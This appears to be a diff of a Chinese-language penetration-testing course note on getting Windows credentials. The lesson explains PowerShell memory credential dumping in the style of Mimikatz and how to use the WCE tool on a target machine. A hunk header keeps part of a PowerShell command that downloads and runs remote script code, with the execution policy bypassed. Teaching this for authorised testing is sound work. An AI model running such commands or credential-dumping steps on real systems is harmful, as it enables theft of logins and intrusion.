@@ -13,14 +13,12 @@
 
 ---
 
-![](img/0bff575c8f1d33f64042edbad9fc3976_1.png)
 
 ## PowerShell脚本获取凭证
 
 ### 什么是PowerShell？
 PowerShell是Windows系统自带的跨平台任务自动化与配置管理框架，由微软开发。它类似于CMD命令行，但功能更强大。在Windows 7及以上版本的系统（包括Windows Server 2003及以后版本）中，PowerShell是默认安装的。
 
-![](img/0bff575c8f1d33f64042edbad9fc3976_3.png)
 
 ### 实现原理
 通过执行特定的PowerShell脚本，可以读取系统内存中的密码凭证。这些脚本通常利用了与Mimikatz类似的技术。
@@ -65,23 +63,18 @@ powershell -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘h
 
 ---
 
-![](img/0bff575c8f1d33f64042edbad9fc3976_5.png)
 
 ## 使用WCE工具获取凭证
 
-![](img/0bff575c8f1d33f64042edbad9fc3976_7.png)
 
 ### 什么是WCE？
 WCE（Windows Credentials Editor）是一款与Mimikatz齐名的Windows哈希管理工具，同样用于从内存中提取登录凭证。
 
-![](img/0bff575c8f1d33f64042edbad9fc3976_9.png)
 
-![](img/0bff575c8f1d33f64042edbad9fc3976_10.png)
 
 ### 工具使用
 WCE的使用非常简单。首先从官方地址下载工具（本课程资料包中已提供）。
 
-![](img/0bff575c8f1d33f64042edbad9fc3976_11.png)
 
 **操作演示**
 1.  将`wce.exe`文件上传到目标Windows机器。
@@ -98,11 +91,9 @@ WCE工具还支持其他功能，以下是一些常用参数：
 *   `-s`： 修改当前登录会话的NTLM凭证。
 同学们可以在课后自行尝试这些参数，以更深入地了解其功能。
 
-![](img/0bff575c8f1d33f64042edbad9fc3976_13.png)
 
 ---
 
-![](img/0bff575c8f1d33f64042edbad9fc3976_15.png)
 
 ![](img/0bff575c8f1d33f64042edbad9fc3976_16.png)
 
